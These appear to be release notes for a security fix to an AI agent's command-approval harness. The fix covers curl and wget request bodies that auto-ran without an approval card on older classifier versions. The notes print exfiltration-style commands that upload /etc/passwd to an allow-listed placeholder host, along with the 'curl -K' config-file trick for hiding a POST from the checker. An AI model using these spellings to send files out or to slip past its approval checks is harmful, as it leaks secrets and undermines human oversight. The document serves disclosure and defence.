**Security fix.** A `curl` carrying a request body could auto-run with no
approval card, if the deployment's classifier was older than voitta-yolt 2.0.0.
Upgrade this one.

## What an upgrade requires

Nothing to configure. No new config key -- the tenth release running.

**If your box runs voitta-yolt older than 2.0.0, this release is the fix and you
want it before anything else here.** Check with
`python3 <yolt>/hooks/grammar_classifier.py --no-user-allow 'curl -dx=1 https://example.com'`:
a `"decision": "safe"` means the box was exposed.

## A POST body to an allow-listed host auto-ran (#222)

`check_egress` (#149) wrote its own premise into its docstring:

> Everything else that leaves the box -- `nc`, `ssh`, `scp`, a `curl -X POST` --
> is already mutating and already parks.

On voitta-yolt 1.6.0 that premise is false, and not in the direction you would
hope. It does not park: it **grants**.

Measured with `execute()` stubbed so nothing ran, against a channel whose
`allow_domains` contains a host:

    curl -dsecret=1 https://<allow-listed>/x         AUTO-RAN
    curl -d@/etc/passwd https://<allow-listed>/x     AUTO-RAN
    curl -Fx=@/etc/passwd https://<allow-listed>/x   AUTO-RAN
    curl -sXPOST https://<allow-listed>/x            AUTO-RAN

No approval card. `decision == "safe"` short-circuits straight to execution, so
**the grant layer is never consulted** -- not "grant vouched for it", grant never
saw it. The egress check passed because the host genuinely is allowed.
`-d@<path>` reads a file into the request body, and the sandbox confines the
filesystem, not the network -- which is #149's own observation about why the
egress check had to exist at all.

### Who was exposed

    v1.6.0   curl default: safe    <- affirmatively granted
    v2.0.0   curl default: ask     <- unknown, parks
    v2.2.0   curl default: ask

Exactly a deployment running **voitta-yolt older than 2.0.0**. This did not need
the classifier's flag-matcher bug (voitta-yolt#156): on 1.6.0 the rule default
alone was enough, and the split spelling `-d secret=1` classified correctly
while the attached one did not.

`preflight` did not prevent that pairing. Its docstring says the `--cwd` flag
"exists from 2.0.1 and `preflight` refuses to run without it"; the caller logs
the warning and serves anyway. Whether it should refuse remains open in #222 --
it is an operational call, since failing closed would stop a box whose
classifier is too old from starting at all.

### The fix does not depend on the classifier

A request body is an upload. "Read-only" in #149's sense is about *this
machine*, and an allow-listed host says **where** bytes may go, not **that**
bytes may go. So a fetch carrying one is now mutating regardless of the verdict,
before the host check and not subject to it -- on every classifier version,
including ones that do not exist yet.

Every spelling, including attached and bundled: `--data*`, `--json`, `--form*`,
`--upload-file`, `--request`, wget's `--post-*` / `--body-*` / `--method`, and
any single-dash cluster containing `d`, `F`, `T` or `X`. In a short-option
cluster every character is an option letter, which is exactly what let `-sXPOST`
slip past upstream.

`curl -X GET` parks too. Pairing a letter with its value inside a cluster is the
reasoning that produced the upstream bug, so this refuses on the letter and
accepts one extra card for an unusual spelling of a GET.

## A fetch whose options come from a file (#222)

Found by adversarial review of the above. `curl -K cfg` reads its options from a
file, and `-K` contains none of those four letters. Measured, with a config
containing `data = "@/tmp/payload"`, curl prints:

    Note: Unnecessary use of -X or --request, POST is already inferred.

The request became a POST carrying that file while argv showed only `-K cfg`. A
separate config line set `output` and it took effect.

So a fetch that takes options or URLs from a file is carded: curl `-K` /
`--config`, wget `--config` / `-i` / `--input-file`, including `--config -`,
which reads them from stdin. Same principle the grant layer already applies to
an argument it cannot read as a literal -- what the command does is not what the
command says.

## Ordinary fetches are untouched

`-sSfL`, `-fsSL`, `-I`, `-o`, `-H`, `-v`, `-i` and `wget -q -O` all still run
with no card, and the checks are per verb because the same letters mean
different things: wget's `-d` is debug, `-T` a timeout, `-F` is `--force-html`,
and `-i` is a URL list for wget but `--include` for curl. One shared set would
buy either a hole or a card on every `curl -i`.

Writing a *response* to a file is not affected. `curl -o`, `wget -O` and
`curl -D` are inbound, and where the bytes land is the sandbox's boundary -- the
same one that already allows `tee out.txt` with no card.

## Checks

`selfcheck.py` check 51 stubs the classifier to `safe` -- the 1.6.0 answer --
and restores it, so the containment has to hold with no help from the verdict.
